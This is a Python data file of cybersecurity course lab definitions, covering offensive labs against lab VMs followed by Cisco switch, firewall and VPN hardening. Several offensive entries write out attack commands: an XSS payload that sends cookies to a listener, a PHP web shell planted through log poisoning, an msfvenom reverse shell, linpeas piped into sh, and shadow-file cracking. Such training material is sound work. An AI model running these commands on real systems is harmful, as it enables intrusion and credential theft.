import json
import os

def create_generator():
    # Helper to generate all 48 classes
    classes = []
    
    # Raw syllabus definitions
    raw_classes = [
        # WEEK 1
        (1, 1, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 1: Foundation & Traffic Analysis", 
         "Linux for Security & OS Reconnaissance", "Reconnaissance", "Beginner",
         "Gain Linux command-line fluency and discover host-level configurations through automated reconnaissance scripts.",
         ["Kali Linux", "Bash", "cron"], "Local Kali VM", "bash",
         "ip -br addr show\nuname -a && whoami\ncat << 'EOF' > enum_host.sh\n#!/usr/bin/env bash\necho '=== USERS ==='\ncut -d: -f1,3 /etc/passwd | grep -E ':([0-9]{4}|0)$'\necho '=== PORTS ==='\nss -tuln\nEOF\nchmod +x enum_host.sh && ./enum_host.sh",
         "Deploy a fresh Kali Linux VM. Author and run a Bash script that automatically enumerates host user accounts, active services, open network connections, and cron jobs, piping the output into a clean target assessment file.",
         "Linux user accounts, open sockets, and cron jobs logged to assessment file.",
         "Why is local reconnaissance often the first action of an adversary?", "UID 0 represents root; check /etc/passwd for accounts."),

        (2, 1, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 1: Foundation & Traffic Analysis", 
         "Network Traffic & Packet Sniffing", "Traffic Analysis", "Beginner",
         "Capture local frame traffic and isolate sensitive plaintext data vectors using Wireshark and TCPDump.",
         ["Wireshark", "TCPDump", "HTTP"], "Simulated local network traffic", "bash",
         "sudo tcpdump -i eth0 -nn -s 0 -w http_capture.pcap 'tcp port 80' &\ncurl -s -X POST -d 'user=admin&pass=Secret2026' http://192.168.1.100/login.php\nsudo killall tcpdump\ntshark -r http_capture.pcap -Y 'http.request.method == \"POST\"' -T fields -e http.file_data",
         "Initialize a Wireshark capture on an active interface. Generate traffic by submitting authentication forms to a local plaintext HTTP test server. Filter the resulting PCAP dump using http.request.method == 'POST' to locate and extract unencrypted user credentials.",
         "Unencrypted credentials username and password isolated in packet stream.",
         "How does TLS/HTTPS prevent this attack vector?", "Unencrypted HTTP transmits cleartext payloads over port 80."),

        # WEEK 2
        (3, 2, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 2: Scanning & Enumeration", 
         "Open-Source Intelligence (OSINT)", "Reconnaissance", "Beginner",
         "Map an external target's infrastructure profile utilizing public data repositories.",
         ["theHarvester", "Maltego", "Recon-ng"], "Public domain data", "bash",
         "theHarvester -d example.com -l 200 -b duckduckgo,crtsh\ndig +short MX example.com\ndig +short TXT example.com",
         "Use theHarvester from a Kali terminal to passively accumulate public subdomains and corporate emails from a live domain. Port this discovery index into Maltego to visually map structural associations between assets, name servers, and IP addresses.",
         "Discovery map of company subdomains, IP ranges, and MX mail endpoints.",
         "Why is passive OSINT completely undetectable by target intrusion detection systems?", "Passive recon queries third-party indexes like search engines and certificate logs."),

        (4, 2, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 2: Scanning & Enumeration", 
         "Active Vulnerability Scanning", "Scanning", "Beginner",
         "Identify network-accessible ports, service banners, and unpatched operating system bugs using Nmap.",
         ["Nmap", "Metasploitable 2", "netdiscover"], "Metasploitable 2 VM (192.168.1.105)", "bash",
         "sudo netdiscover -r 192.168.1.0/24\nsudo nmap -sS -sV 192.168.1.105\nsudo nmap -p 21,80,3306 --script vuln 192.168.1.105",
         "Execute a stealth TCP SYN scan (nmap -sS) against a local host interface. Apply service-version detection rules (-sV) to find outdated software headers, then invoke the Nmap Scripting Engine (--script vuln) to confirm an exploit fingerprint (e.g., vsftpd 2.3.4).",
         "Nmap table revealing port 21 (vsftpd 2.3.4 backdoor), port 80 (Apache 2.2.8), and CVE-2011-2523.",
         "Why does version detection matter more than knowing just which ports are open?", "Vulnerabilities attach directly to specific code versions, not just port numbers."),

        # WEEK 3
        (5, 3, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 3: Exploitation & Password Cracking", 
         "The Metasploit Framework", "Exploitation", "Intermediate",
         "Deploy targeted payloads to weaponize software vulnerabilities.",
         ["Metasploit (msfconsole)", "Metasploitable 2"], "Metasploitable 2 VM", "msf",
         "msfconsole -q\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.105\nset PAYLOAD cmd/unix/interact\nshow options\nexploit\nwhoami",
         "Open msfconsole and recall the vsftpd backdoor module verified in Week 2. Configure target context metrics (RHOSTS / LHOST), run the attack script to pull down a low-privilege reverse shell, and execute an upgrade routine to spawn a Meterpreter session.",
         "Command shell session 1 opened. Output of whoami yields 'root'.",
         "What is the difference between an exploit and a payload in Metasploit?", "An exploit breaks open the entry vector; the payload dictates what happens once access is gained."),

        (6, 3, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 3: Exploitation & Password Cracking", 
         "Brute-Forcing & Hash Cracking", "Credential Attacks", "Intermediate",
         "Force active online services and systematically crack stolen system credential files.",
         ["Hydra", "John the Ripper", "rockyou.txt"], "Compromised Metasploitable VM", "bash",
         "hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105 -t 4\nunshadow /tmp/passwd /tmp/shadow > unshadowed.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt\njohn --show unshadowed.txt",
         "Launch Hydra against an active SSH service port using the rockyou.txt dictionary file. Upon entry, extract the target system's shadow password file (/etc/shadow), transport it back to Kali, and execute John the Ripper to extract plaintext credentials.",
         "SSH login recovered: msfadmin:msfadmin. Shadow password hashes cracked to cleartext.",
         "Why do password salting and slow hashing algorithms like Argon2 mitigate rainbow table attacks?", "Salts make identical passwords yield unique hashes; work factors slow brute forcing."),

        # WEEK 4
        (7, 4, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 4: Web Application Security I", 
         "Web Proxies & Traffic Manipulation", "Web App Security", "Intermediate",
         "Capture and modify inline application parameters to break client-side logical rules.",
         ["Burp Suite Community", "FoxyProxy", "DVWA"], "Damn Vulnerable Web App (DVWA)", "bash",
         "# In Burp Suite Proxy Tab:\n# Intercept request on http://192.168.1.105/dvwa/vulnerabilities/fi/\n# Modify Parameter 'price=500' -> 'price=1'\n# Forward modified request to target server",
         "Configure a web browser to proxy traffic through Burp Suite Community Edition. Trigger a form validation interface inside DVWA, intercept the outgoing request token, change the hidden price or access value, and forward it to bypass application barriers.",
         "HTTP request intercepted, parameters rewritten, and transaction completed with forged values.",
         "Why must input validation always be enforced on the backend server rather than the client browser?", "Client-side code can be trivially bypassed or altered using proxy interceptors."),

        (8, 4, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 4: Web Application Security I", 
         "SQL Injection (SQLi)", "Web App Security", "Intermediate",
         "Pass unauthorized database queries into web forms to circumvent application logic.",
         ["Burp Suite", "SQLMap", "DVWA"], "DVWA (Low Security setting)", "bash",
         "# Manual test in DVWA User ID input:\n# ' OR 1=1 --\nsqlmap -u \"http://192.168.1.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=abc123; security=low\" --dbs\nsqlmap -u \"http://192.168.1.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=abc123; security=low\" -D dvwa --tables",
         "Identify an input field vulnerable to database errors inside DVWA. Inject a manual ' OR 1=1 -- string to access hidden tables. Capture the functional HTTP header and feed the query context into SQLMap to automate an extraction of the backend system schema.",
         "Database schema dumped, revealing 'users' table and password hashes.",
         "How do Prepared Statements (Parameterized Queries) eradicate SQL injection vulnerabilities?", "Parameters are treated strictly as data literals rather than executable SQL code."),

        # WEEK 5
        (9, 5, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 5: Web Application Security II", 
         "Cross-Site Scripting (XSS)", "Web App Security", "Intermediate",
         "Inject client-side execution payloads into application inputs to target session vectors.",
         ["Burp Suite", "DVWA", "JavaScript"], "Damn Vulnerable Web App (DVWA)", "bash",
         "# Test Reflected XSS:\n# Input: <script>alert(document.domain)</script>\n# Test Stored XSS Guestbook:\n# Message: <script>fetch('http://192.168.1.50:8000/?c=' + encodeURIComponent(document.cookie))</script>\npython3 -m http.server 8000",
         "Test input entry fields for Reflected XSS. Move to the Stored XSS validation console and implant a persistent payload script (<script>alert(document.cookie)</script>). Verify the execution of the alert panel across alternate client browser sessions to demonstrate token theft mechanics.",
         "Stored script executes in visitor browsers, transmitting session cookies to attacker listener.",
         "What is the difference between Reflected, Stored, and DOM-based XSS?", "Stored persists in the database; Reflected echoes immediately in responses; DOM alters client DOM."),

        (10, 5, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 5: Web Application Security II", 
         "File Inclusion & Directory Traversal", "Web App Security", "Intermediate",
         "Read system configuration matrices and gain remote script execution via application loops.",
         ["Kali Linux", "DVWA", "cURL"], "DVWA", "bash",
         "curl -s \"http://192.168.1.105/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd\"\ncurl -s -H \"User-Agent: <?php system($_GET['c']); ?>\" http://192.168.1.105/\ncurl -s \"http://192.168.1.105/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&c=id\"",
         "Manipulate URL file parameters in DVWA to climb directories and view host files via local file inclusion (../../../../etc/passwd). Poison the active web server access log using a custom User-Agent string containing PHP code, then call the log path via LFI to invoke a terminal shell.",
         "Linux /etc/passwd contents displayed in browser; web shell command execution verified via log poisoning.",
         "Why does log poisoning escalate a read-only Local File Inclusion into full Remote Code Execution?", "The LFI executes PHP tags embedded within the poisoned log file upon server interpretation."),

        # WEEK 6
        (11, 6, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 6: Privilege Escalation", 
         "Linux Privilege Escalation", "Privilege Escalation", "Intermediate",
         "Identify and abuse misconfigured environmental flags to elevate standard privileges to root.",
         ["LinPEAS", "GTFOBins", "SUID"], "Custom Linux VM", "bash",
         "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\nfind / -perm -4000 2>/dev/null | grep -E '(find|vim|nmap|bash)'\n/usr/bin/find . -exec /bin/sh -p \\; -quit\nwhoami",
         "Transport the LinPEAS shell assessment asset to a compromised host. Evaluate the script output anomalies to isolate binaries flagged with misconfigured SUID bits. Cross-reference findings with the GTFOBins registry to execute code escape parameters and achieve a full root prompt.",
         "Elevation to root confirmed: uid=0(root) gid=0(root) achieved via misconfigured SUID binary.",
         "What is the purpose of the SUID bit on Linux binaries, and why is setting it on compilers or editors fatal?", "SUID executes binary as owner (root); interactive binaries let users spawn root subshells."),

        (12, 6, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 6: Privilege Escalation", 
         "Windows Privilege Escalation", "Privilege Escalation", "Intermediate",
         "Bypass Windows authorization levels to seize administrative access over an endpoint.",
         ["WinPEAS", "Metasploit", "Windows 10 Evaluation ISO"], "Windows 10 VM", "windows",
         "powershell -c \"Invoke-WebRequest -Uri 'http://192.168.1.50/winPEASx64.exe' -OutFile 'C:\\temp\\winPEAS.exe'\"\nC:\\temp\\winPEAS.exe quiet servicesinfo\nwmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe-service -o \"C:\\Program.exe\"\nnet start VulnerableService",
         "Initialize a low-privilege user session on a Windows 10 target VM. Run the WinPEAS system audit script to locate an 'Unquoted Service Path' within a running process. Compile a custom placeholder executable using cross-compilers, position it within the path breaks, and restart the target service to claim NT AUTHORITY\\SYSTEM context.",
         "Reverse shell received on Kali with NT AUTHORITY\\SYSTEM privileges.",
         "Why does Windows attempt to execute C:\\Program.exe when encountering 'C:\\Program Files\\App\\service.exe' unquoted?", "Windows splits unquoted paths on whitespace and appends .exe at each token."),

        # WEEK 7
        (13, 7, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 7: Advanced Network Attacks", 
         "Man-in-the-Middle (MitM) & Sniffing", "Network Attacks", "Advanced",
         "Poison local network broadcasts to siphon administrative directory tokens.",
         ["Responder", "Hashcat", "LLMNR"], "Simulated Active Directory Subnet", "bash",
         "sudo responder -I eth0 -dwv\n# On victim Windows machine:\n# net use \\\\nonexistent-server\\share\n# Check Responder capture log for NetNTLMv2 hash\nhashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt --force",
         "Deploy Responder on an internal network segment to monitor local LLMNR and NetBIOS broadcast lookups. Trigger an access failure from a separate client machine looking for a generic server share, intercept the resulting cryptographic NetNTLMv2 hash response, and process the file offline.",
         "NetNTLMv2 hash captured in Responder and cracked offline with Hashcat.",
         "Why should LLMNR and NBT-NS protocols be strictly disabled across enterprise Group Policies?", "They broadcast name queries over local subnets, allowing any rogue listener to spoof responses."),

        (14, 7, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 7: Advanced Network Attacks", 
         "Active Directory Fundamentals", "Active Directory", "Advanced",
         "Enumerate domain trusts and relationships to highlight operational paths to domain dominance.",
         ["BloodHound", "SharpHound", "neo4j"], "Domain-joined Windows VM", "windows",
         "powershell -ep bypass\n.\\SharpHound.exe -c All --outputdirectory C:\\temp\n# On Kali analysis workstation:\nsudo neo4j start\nbloodhound &\n# Upload generated ZIP file and query 'Shortest Paths to Domain Admins'",
         "Execute the SharpHound collection toolkit from a domain-joined machine. Secure the generated JSON dump files and populate them into BloodHound. Run structural graph queries to trace path links connecting the standard account to Domain Administrator groups.",
         "BloodHound graph renders attack path: User -> GenericAll on Group -> ForceChangePassword -> Domain Admin.",
         "Why are Active Directory Access Control Lists (ACLs) often more vulnerable than software flaws?", "Complex delegation permissions accumulate over years, creating unintended administrative rights."),

        # WEEK 8
        (15, 8, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 8: Post-Exploitation & Blue Team Pivot", 
         "Pivoting & Lateral Movement", "Lateral Movement", "Advanced",
         "Establish multi-hop proxies to access internal assets that are not publicly exposed.",
         ["Proxychains", "Chisel", "SOCKS5"], "Dual-homed Linux server (public/internal)", "bash",
         "# On Kali (Server):\nchisel server -p 8080 --reverse &\n# On Compromised Pivot Host (Client):\n./chisel client 192.168.1.50:8080 R:socks &\n# On Kali:\nhead -n 3 /etc/proxychains4.conf\nproxychains nmap -sT -Pn -p 22,80,445 10.0.0.15",
         "Establish a remote session on a dual-homed host that links a public network to a private internal network tier. Configure a Chisel proxy connection to set up an inline reverse SOCKS tunnel. Modify the local attacker configuration (/etc/proxychains4.conf) to launch internal Nmap tools inside the hidden segment.",
         "Internal subnet 10.0.0.0/24 successfully scanned and accessed through the SOCKS proxy.",
         "Why can SYN scans (-sS) not be run through a SOCKS proxy via proxychains?", "SOCKS proxies operate at Layer 5/7 (TCP connect), requiring complete socket creation (-sT)."),

        (16, 8, 1, "Phase 1: Offensive Security & Penetration Testing", "Week 8: Post-Exploitation & Blue Team Pivot", 
         "Log Analysis & Incident Response", "Incident Response", "Intermediate",
         "Parse data footprints left by attacker vectors inside network traffic repositories.",
         ["Splunk", "Snort", "SPL"], "Splunk-integrated VM", "splunk",
         "index=web_logs sourcetype=access_combined status=200\n| stats count by clientip, uri\n| sort -count\nindex=snort_alerts | stats count by signature, src_ip, dest_ip\nindex=web_logs uri=\"*OR*\" OR uri=\"*alert*\" | table _time, clientip, uri, status",
         "Set up a standalone Splunk instance. Ingest raw Apache application logs and Snort signature alert strings captured during the web attacks executed in Week 4. Construct Search Processing Language (SPL) filters to map the threat timeline and identify the adversary's IP address.",
         "Adversary reconnaissance, SQL injection, and payload execution timeline cleanly reconstructed.",
         "Why is log timestamp synchronization (NTP) critical for forensic investigations?", "Unsynced clocks make correlating event streams across perimeter firewalls and servers impossible."),

        # PHASE 2: NETWORK SECURITY & INFRASTRUCTURE DEFENSE (WEEKS 9-16)
        # WEEK 9
        (17, 9, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 9: Layer 2 Switch Hardening", 
         "Securing the Management Plane", "Switch Hardening", "Intermediate",
         "Lock down structural terminal lines to deny unencrypted administrative connections.",
         ["Cisco Packet Tracer", "SSHv2", "Cisco IOS"], "Cisco Packet Tracer: 1 Switch, 1 Admin PC", "cisco",
         "enable\nconfigure terminal\nhostname SW-CORE\nip domain-name enterprise.local\ncrypto key generate rsa modulus 2048\nip ssh version 2\nusername admin secret Cisco@Sec2026\nline vty 0 4\n transport input ssh\n login local\n exec-timeout 5 0\nexit\nlogin block-for 120 attempts 3 within 60\nend",
         "Open Cisco Packet Tracer and build a switch-to-administrator topology. Disable baseline cleartext operational access models (Telnet/HTTP). Configure local database profiles, mandate SSHv2 execution, set up aggressive shell timeouts, and implement the login block-for lockout parameter.",
         "Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout.",
         "Why is Telnet strictly prohibited in enterprise management planes?", "Telnet transmits administrative login passwords in unencrypted plaintext frames."),

        (18, 9, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 9: Layer 2 Switch Hardening", 
         "Port Security & MAC Layer Defense", "Switch Hardening", "Intermediate",
         "Bind hardware interfaces to specific host identifiers to eliminate access layer spoofing.",
         ["Cisco Packet Tracer", "Port Security"], "Cisco Packet Tracer: 1 Switch, 2 PCs, 1 Rogue PC", "cisco",
         "enable\nconfigure terminal\ninterface FastEthernet0/1\n switchport mode access\n switchport port-security\n switchport port-security maximum 1\n switchport port-security mac-address sticky\n switchport port-security violation shutdown\nexit\nerrdisable recovery cause psecure-violation\nerrdisable recovery interval 300\nend\nshow port-security interface FastEthernet0/1",
         "Configure access ports across an enterprise network switch with Sticky port security models (switchport port-security mac-address sticky). Define maximum host thresholds to 1 and change violation rules to shutdown. Attach a non-authorized endpoint node and verify interface transitioning into an err-disabled status.",
         "Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately.",
         "What is the difference between violation modes 'protect', 'restrict', and 'shutdown'?", "Protect drops packets silently; Restrict drops and sends SNMP trap; Shutdown disables port."),

        # WEEK 10
        (19, 10, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 10: VLAN Security & DHCP Mitigations", 
         "Mitigating VLAN Hopping Attacks", "VLAN Security", "Intermediate",
         "Eliminate frame spoofing parameters that attempt to cross internal trunk borders.",
         ["Cisco Packet Tracer", "802.1Q"], "Cisco Packet Tracer: 2 Switches, 3 VLANs", "cisco",
         "enable\nconfigure terminal\nvlan 999\n name BLACKHOLE_UNUSED\nvlan 777\n name NATIVE_ISOLATED\nexit\ninterface range FastEthernet0/10 - 24\n switchport mode access\n switchport access vlan 999\n shutdown\nexit\ninterface GigabitEthernet0/1\n switchport trunk encapsulation dot1q\n switchport mode trunk\n switchport nonegotiate\n switchport trunk native vlan 777\nend",
         "Turn off Dynamic Trunking Protocol negotiation across all user-facing interfaces (switchport nonegotiate). Change the default native configuration from VLAN 1 to an isolated, unrouted target VLAN ID number. Reassign all inactive interfaces to an isolated 'Black Hole' VLAN and shut them down.",
         "DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN.",
         "How does an attacker exploit double-tagging 802.1Q frames to hop VLANs?", "Outer tag matches native VLAN and is stripped by switch; inner tag routes frame into target VLAN."),

        (20, 10, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 10: VLAN Security & DHCP Mitigations", 
         "DHCP Snooping Configuration", "LAN Security", "Intermediate",
         "Filter network broadcasts to stop unauthorized rogue addressing architectures.",
         ["Cisco Packet Tracer", "DHCP Snooping"], "Cisco Packet Tracer: 1 Switch, 1 Server, 1 Rogue", "cisco",
         "enable\nconfigure terminal\nip dhcp snooping\nip dhcp snooping vlan 10,20\nno ip dhcp snooping information option\ninterface GigabitEthernet0/1\n ip dhcp snooping trust\nexit\ninterface range FastEthernet0/1 - 24\n ip dhcp snooping limit rate 15\nend\nshow ip dhcp snooping\nshow ip dhcp snooping binding",
         "Globally initiate DHCP Snooping options across consumer communication segments. Explicitly assign the network link pointing to the enterprise core server as a trusted port, while forcing standard edge access lines into an untrusted profile bounded by packet rate limiters.",
         "Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table.",
         "How does a rogue DHCP server allow an attacker to intercept all outbound client traffic?", "It hands out its own IP as default gateway, routing all traffic through the attacker."),

        # WEEK 11
        (21, 11, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 11: Spoofing Protections & IP Filtering", 
         "Dynamic ARP Inspection (DAI)", "LAN Security", "Intermediate",
         "Correlate frame addressing logs against network tables to kill packet-redirection threats.",
         ["Cisco Packet Tracer", "DAI"], "Cisco Packet Tracer: 1 Switch, 1 Router, 2 PCs", "cisco",
         "enable\nconfigure terminal\nip arp inspection vlan 10\ninterface GigabitEthernet0/1\n ip arp inspection trust\nexit\ninterface range FastEthernet0/1 - 24\n ip arp inspection limit rate 15\nend\nshow ip arp inspection vlan 10",
         "Activate Dynamic ARP Inspection routines within target environment VLAN profiles. Map the physical link towards the main perimeter router interface as an explicitly trusted path. Inject a simulated invalid gratuitous ARP stream from an unauthorized node and track drop logs on the switch console.",
         "Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged.",
         "Why does Dynamic ARP Inspection depend directly on DHCP Snooping?", "DAI validates ARP IP-to-MAC associations against the DHCP Snooping database table."),

        (22, 11, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 11: Spoofing Protections & IP Filtering", 
         "Access Control Lists (ACLs)", "Firewalling", "Intermediate",
         "Implement strict access control boundaries across internal router interface gateways.",
         ["Cisco Packet Tracer", "Extended ACL"], "Cisco Packet Tracer: Core Router, Subnets, DMZ", "cisco",
         "enable\nconfigure terminal\nip access-list extended DMZ_FILTER\n permit tcp any host 192.168.2.20 eq 80\n permit tcp any host 192.168.2.20 eq 443\n deny icmp any any\n permit ip any any\nexit\ninterface GigabitEthernet0/1\n ip access-group DMZ_FILTER in\nend\nshow ip access-lists",
         "Construct a standard ACL policy sequence to prevent an engineering subnet from establishing sessions inside a finance data segment. Write an Extended Named ACL on an edge router interface that allows only inbound web queries (port 80/443) to reach a DMZ host while dropping all inbound echo query requests (ping).",
         "Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment.",
         "Where should Extended ACLs be placed relative to Standard ACLs for optimal network efficiency?", "Extended ACLs as close to the source as possible; Standard ACLs close to destination."),

        # WEEK 12
        (23, 12, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 12: Network Identity & Firewalls", 
         "AAA Authentication (RADIUS/TACACS+)", "Identity & Access", "Intermediate",
         "Consolidate infrastructure device credentials into a central identity server.",
         ["Cisco Packet Tracer", "AAA", "RADIUS"], "Cisco Packet Tracer: 1 Core Router, 1 AAA Server", "cisco",
         "enable\nconfigure terminal\naaa new-model\nradius server RADIUS_SRV\n address ipv4 192.168.1.100 auth-port 1812 acct-port 1813\n key RadiusSecret2026\nexit\naaa authentication login default group radius local\nusername fallback-admin privilege 15 secret SuperBackup2026\nline vty 0 4\n login authentication default\nend",
         "Setup a centralized AAA authentication server profile inside a network topology. Program the terminal lines of core distribution switches and routing interfaces to validate login sequences against the remote database using cryptographic keys, and set up a local fallback path for emergency local access.",
         "VTY logins authenticate against RADIUS server; fallback account works when server is offline.",
         "Why is TACACS+ often preferred over RADIUS for administrative network device management?", "TACACS+ encrypts the entire packet payload and decouples Authentication from Authorization."),

        (24, 12, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 12: Network Identity & Firewalls", 
         "Zone-Based Policy Firewalls (ZBF)", "Firewalling", "Advanced",
         "Group routing interfaces into logical security environments regulated by inspection engines.",
         ["Cisco Packet Tracer", "ZBF", "Cisco IOS"], "Cisco Packet Tracer: 1 Router, 2 Security Zones", "cisco",
         "enable\nconfigure terminal\nzone security IN_ZONE\nzone security OUT_ZONE\nclass-map type inspect match-any PROTOCOLS\n match protocol tcp\n match protocol udp\n match protocol icmp\npolicy-map type inspect IN_TO_OUT_POLICY\n class type inspect PROTOCOLS\n  inspect\n class class-default\n  drop\nzone-pair security IN_TO_OUT source IN_ZONE destination OUT_ZONE\n service-policy type inspect IN_TO_OUT_POLICY\ninterface GigabitEthernet0/0\n zone-member security IN_ZONE\ninterface GigabitEthernet0/1\n zone-member security OUT_ZONE\nend",
         "Program an internal router with explicit security boundaries by creating an INSIDE zone and an OUTSIDE zone. Define traffic map classes matching core network communication vectors (TCP/UDP/ICMP). Apply matching inspection rules inside a zone-pair profile to permit stateful internal lookups while dropping uninitiated external entries.",
         "Inside clients initiate connections freely; outside initiated unsolicited traffic dropped.",
         "What makes ZBF stateful compared to standard static Access Control Lists?", "ZBF dynamically creates return state table entries for established connections."),

        # WEEK 13
        (25, 13, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 13: Advanced Firewall Architectures", 
         "Cisco ASA Firewall Basics", "Firewalling", "Advanced",
         "Deploy and run a hardware firewall gateway system at the network edge.",
         ["Cisco Packet Tracer", "Cisco ASA 5506-X"], "Cisco Packet Tracer: 1 ASA 5506-X, 1 Inside PC, 1 Router", "cisco",
         "enable\nconfigure terminal\ninterface GigabitEthernet1/1\n nameif inside\n security-level 100\n ip address 192.168.1.1 255.255.255.0\n no shutdown\ninterface GigabitEthernet1/2\n nameif outside\n security-level 0\n ip address 203.0.113.2 255.255.255.0\n no shutdown\nroute outside 0.0.0.0 0.0.0.0 203.0.113.1\ndhcpd address 192.168.1.10-192.168.1.50 inside\ndhcpd enable inside\nend\nshow ip address",
         "Place a Cisco ASA 5506-X appliance template into the perimeter design map. Configure the baseline interfaces, applying appropriate security naming parameters and privilege levels (inside = 100, outside = 0). Write static routing references and build an internal DHCP pool handled by the firewall.",
         "Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0.",
         "What is the default traffic flow rule between Cisco ASA security levels?", "Traffic from higher security levels to lower is allowed; lower to higher is denied by default."),

        (26, 13, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 13: Advanced Firewall Architectures", 
         "ASA Access Lists & NAT", "Firewalling", "Advanced",
         "Define translation rules and filter external connections tracking toward sensitive assets.",
         ["Cisco Packet Tracer", "ASA NAT", "ACL"], "Cisco Packet Tracer: 1 ASA, LAN, Web Server, DMZ", "cisco",
         "enable\nconfigure terminal\nobject network INSIDE_LAN\n subnet 192.168.1.0 255.255.255.0\n nat (inside,outside) dynamic interface\nobject network DMZ_MAIL\n host 192.168.2.25\n nat (dmz,outside) static 203.0.113.25\naccess-list OUTSIDE_IN extended permit tcp any host 203.0.113.25 eq 25\naccess-group OUTSIDE_IN in interface outside\nend\nshow xlate",
         "Implement Dynamic PAT (Port Address Translation) on the ASA to enable internal hosts to securely share a public interface address space. Configure a Static NAT translation link for a DMZ Mail Server. Apply an object-group access list to restrict external inbound access strictly to mail traffic (port 25).",
         "Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ.",
         "What is the distinction between Dynamic PAT and Static 1-to-1 NAT?", "PAT translates multiple hosts to one public IP via ports; Static NAT binds one dedicated IP."),

        # WEEK 14
        (27, 14, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 14: Site-to-Site Encrypted Tunnels", 
         "GRE Tunnels over IPsec (Phase 1)", "VPN & Tunnels", "Advanced",
         "Form an overlay virtual network bridge across an open ISP framework to allow routing communication.",
         ["Cisco Packet Tracer", "GRE", "OSPF"], "Cisco Packet Tracer: 2 Branch Routers, ISP Router", "cisco",
         "enable\nconfigure terminal\ninterface Tunnel0\n ip address 10.10.10.1 255.255.255.252\n tunnel source GigabitEthernet0/0\n tunnel destination 203.0.113.2\n router ospf 1\n network 10.10.10.0 0.0.0.3 area 0\n network 192.168.1.0 0.0.0.255 area 0\nend\nshow ip interface brief\nshow ip route ospf",
         "Build static connectivity routes across an untrusted ISP link separating two company branch routers. Configure a virtual tunnel interface on each edge system, declaring tunnel sources, destination targets, and internal networks. Initialize an active OSPF routing domain directly across the tunnel interface.",
         "Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0.",
         "Why does raw GRE encapsulation fail to provide security over the public internet?", "GRE encapsulates layer 3 packets but provides zero confidentiality or encryption."),

        (28, 14, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 14: Site-to-Site Encrypted Tunnels", 
         "IPsec Tunnel Protection (Phase 2)", "VPN & Tunnels", "Advanced",
         "Apply high-grade encryption layers over virtual routes to secure company traffic.",
         ["Cisco Packet Tracer", "IPsec", "ISAKMP"], "Cisco Packet Tracer (Branch Routers)", "cisco",
         "enable\nconfigure terminal\ncrypto isakmp policy 10\n encr aes 256\n hash sha256\n authentication pre-share\n group 14\ncrypto isakmp key TunnelSecretKey2026 address 203.0.113.2\ncrypto ipsec transform-set TS_ESP esp-aes esp-sha256-hmac\n mode transport\ncrypto map IPSEC_MAP 10 ipsec-isakmp\n set peer 203.0.113.2\n set transform-set TS_ESP\n match address GRE_TRAFFIC\ninterface GigabitEthernet0/0\n crypto map IPSEC_MAP\nend\nshow crypto session",
         "Build an ISAKMP Phase 1 management profile (AES-256, SHA-256, DH Group 14) on both branch devices. Create the Phase 2 IPsec transform set configuration parameters. Establish a crypto map index tied to an ACL that catches the GRE tunnel headers, and apply it to the physical public interface.",
         "Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames.",
         "What is the difference between IPsec Tunnel mode and Transport mode when securing GRE?", "Transport mode preserves GRE header and encrypts payload, avoiding double IP encapsulation."),

        # WEEK 15
        (29, 15, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 15: Remote Access & Infrastructure Monitoring", 
         "Remote Access VPNs on Cisco ASA", "VPN & Tunnels", "Advanced",
         "Support secure external remote access architecture connections for remote workers.",
         ["Cisco Packet Tracer", "Cisco AnyConnect", "ASA"], "Cisco Packet Tracer: 1 ASA, 1 ISP, 1 Remote PC", "cisco",
